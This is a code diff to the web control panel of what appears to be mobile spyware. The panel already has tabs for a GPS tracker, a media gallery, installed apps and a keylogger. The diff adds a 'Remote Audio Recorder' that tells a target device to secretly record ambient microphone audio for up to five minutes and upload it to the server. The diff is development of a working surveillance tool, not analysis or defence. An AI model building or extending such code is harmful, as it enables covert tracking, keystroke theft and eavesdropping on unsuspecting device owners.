@@ -672,12 +672,13 @@ body {
         </div>
     </section>
 
-    <!-- Main Tabs (Screen Data removed) -->
+    <!-- Main Tabs -->
     <div class="controls">
         <button class="control-btn" onclick="showApps(this)">▦ Installed Apps</button>
         <button class="control-btn" onclick="showGPS(this)">📍 GPS Tracker</button>
         <button class="control-btn" onclick="showGallery(this)">🖼 Media Gallery</button>
         <button class="control-btn" onclick="showKeylog(this)">⌨ Keylogger</button>
+        <button class="control-btn" onclick="showAudio(this)">🎤 Audio Recorder</button>
     </div>
 
     <!-- GPS Tracker Panel -->
@@ -752,13 +753,38 @@ body {
         </div>
     </section>
 
-    <!-- Keylogger Panel (includes full screen data) -->
+    <!-- Keylogger Panel -->
     <section class="panel" id="keylogPanel" style="display:none;">
         <div class="panel-header">
             <div class="panel-title">⌨ Keylogger</div>
             <button class="refresh-btn" onclick="refreshKeylog()">⟳ Refresh</button>
         </div>
         <div class="keylog-box" id="keylogContent"></div>
+    </section>
+
+    <!-- Audio Recording Panel -->
+    <section class="panel" id="audioPanel" style="display:none;">
+        <div class="panel-header">
+            <div>
+                <div class="panel-title">🎤 Remote Audio Recorder</div>
+                <div class="panel-subtitle">Set duration (10-300 seconds) to record ambient audio via device microphone.</div>
+            </div>
+        </div>
+        <div class="gallery-controls" style="margin: 20px;">
+            <label for="audioDurationSelect">Duration:</label>
+            <select id="audioDurationSelect">
+                <option value="10">10 seconds</option>
+                <option value="30">30 seconds</option>
+                <option value="60" selected>1 minute</option>
+                <option value="120">2 minutes</option>
+                <option value="180">3 minutes</option>
+                <option value="300">5 minutes</option>
+            </select>
+            <button class="force-btn" onclick="sendAudioRequest()">🎙 Start Recording</button>
+        </div>
+        <div id="audioStatus" style="padding: 0 20px 20px 20px; color: #aaa; font-size: 14px;">
+            No active recording.
+        </div>
     </section>
 
 </main>
@@ -1022,10 +1048,11 @@ function nextMedia() { if (galleryItems.length) { currentMediaIndex = (currentMe
 
 // ================== TABS ==================
 function setActiveTab(btn) { document.querySelectorAll(".control-btn").forEach(b => b.classList.remove("active")); btn.classList.add("active"); }
-function showApps(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "block"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; loadDeviceInfo(); }
-function showGPS(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "block"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; loadDeviceInfo(); setTimeout(() => { if (map) map.invalidateSize(); }, 100); }
-function showGallery(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "block"; document.getElementById("keylogPanel").style.display = "none"; fetchGalleryPhotos(false); }
-function showKeylog(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "block"; refreshKeylog(); }
+function showApps(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "block"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("audioPanel").style.display = "none"; loadDeviceInfo(); }
+function showGPS(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "block"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("audioPanel").style.display = "none"; loadDeviceInfo(); setTimeout(() => { if (map) map.invalidateSize(); }, 100); }
+function showGallery(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "block"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("audioPanel").style.display = "none"; fetchGalleryPhotos(false); }
+function showKeylog(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "block"; document.getElementById("audioPanel").style.display = "none"; refreshKeylog(); }
+function showAudio(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("audioPanel").style.display = "block"; }
 
 // ================== FORCE GPS UPDATE ==================
 async function forceGpsUpdate() {
@@ -1078,6 +1105,32 @@ async function refreshKeylog() {
     } catch (e) {
         console.error(e);
         container.innerHTML = "Error loading keylogs.";
+    }
+}
+
+// ================== AUDIO RECORDER ==================
+async function sendAudioRequest() {
+    const deviceId = getDeviceId();
+    const duration = parseInt(document.getElementById("audioDurationSelect").value);
+    const btn = event.target;
+    btn.disabled = true;
+    btn.innerHTML = '⏳ Sending...';
+    document.getElementById("audioStatus").innerHTML = 'Request sent. Waiting for device to record and upload...';
+    try {
+        const res = await fetch('/api/audio/request', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ deviceId, duration })
+        });
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.error || 'Failed');
+        document.getElementById("audioStatus").innerHTML = 
+            `Recording requested for ${duration} seconds. Check server uploads/audio folder.`;
+    } catch (e) {
+        document.getElementById("audioStatus").innerHTML = `Error: ${e.message}`;
+    } finally {
+        btn.disabled = false;
+        btn.innerHTML = '🎙 Start Recording';
     }
 }
 
